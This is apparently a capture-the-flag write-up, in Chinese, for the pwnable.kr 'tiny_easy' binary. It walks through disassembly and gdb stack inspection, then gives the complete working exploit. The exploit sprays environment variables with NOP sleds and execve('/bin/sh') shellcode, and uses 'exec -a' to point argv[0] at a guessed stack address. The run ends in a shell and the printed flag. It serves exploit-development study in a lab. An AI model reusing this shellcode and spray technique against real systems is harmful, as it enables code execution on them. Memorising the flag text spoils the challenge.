# tiny_easy

```
tiny_easy@pwnable:~$ checksec tiny_easy 
[*] '/home/tiny_easy/tiny_easy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

程式很小

argv 去控制要跳到哪裡去，我們可以構造環境變數裡面含有 shellcode，程式載入時也會把變數載入到記憶體中

shellcode 長得像 nop*??+shellcode

用 `exec -a ` 控制argv[0]，並且送到背景執行，不然seg fault ssh會斷掉

argv[0] 控制成 env 大概的位置，可以從gdb看到
```
LOAD:08048054                 public start
LOAD:08048054 start           proc near
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx  // argv[0] 前四bytes
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
LOAD:08048058
LOAD:08048058 LOAD            ends
LOAD:08048058
```

```

──────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────────────────
 ► 0x8048054    pop    eax
   0x8048055    pop    edx
   0x8048056    mov    edx, dword ptr [edx]
   0x8048058    call   edx
 
   0x804805a    add    byte ptr [eax], al
   0x804805c    add    byte ptr [eax], al
   0x804805e    add    byte ptr [eax], al
   0x8048060    add    byte ptr [eax], al
   0x8048062    add    byte ptr [eax], al
   0x8048064    add    byte ptr [eax], al
   0x8048066    add    byte ptr [eax], al
───────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd150 ◂— 0x1
01:0004│     0xffffd154 —▸ 0xffffd2e8 —▸ 0x6d6f682f ◂— 0x6d6f682f ('/hom')
02:0008│     0xffffd158 ◂— 0x0
03:000c│     0xffffd15c —▸ 0xffffd312 —▸ 0x4c454853 ◂— 0x4c454853 ('SHEL')
04:0010│     0xffffd160 —▸ 0xffffd322 —▸ 0x4f4c4f43 ◂— 0x4f4c4f43 ('COLO')
05:0014│     0xffffd164 —▸ 0xffffd336 —▸ 0x4d524554 ◂— 0x4d524554 ('TERM')
06:0018│     0xffffd168 —▸ 0xffffd352 —▸ 0x474e414c ◂— 0x474e414c ('LANG')
07:001c│     0xffffd16c —▸ 0xffffd362 —▸ 0x415f434c ◂— 0x415f434c ('LC_A')



(gdb) info frame
Stack level 0, frame at 0x0:
 eip = 0x8048054; saved eip = <unavailable>
 Outermost frame: outermost
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp in esp
(gdb) x/100x $sp
0xff80df60:     0x00000001      0xff80ed0f      0x00000000      0xff80ed29
0xff80df70:     0xff80ed39      0xff80ed4b      0xff80ed61      0xff80ed74
0xff80df80:     0xff80ed84      0xff80ed98      0xff80edba      0xff80edcc
0xff80df90:     0xff80ede0      0xff80edef      0xff80ee03      0xff80ee0f
0xff80dfa0:     0xff80ee77      0xff80ee90      0xff80ee9f      0xff80eeb8

exec -a $(python -c "print '\x61\xed\x80\xff'") ./tiny_easy &

```


```
for i in {1..500}; do export A_$i=$(python -c 'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"');done;


tiny_easy@pwnable:~$ ^C
tiny_easy@pwnable:~$ exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy &
[1] 401291
tiny_easy@pwnable:~$ fg
exec -a $(python -c "print '\x3d\x33\xcf\xff'") ./tiny_easy
$ cat flag
What a tiny task :) good job!
```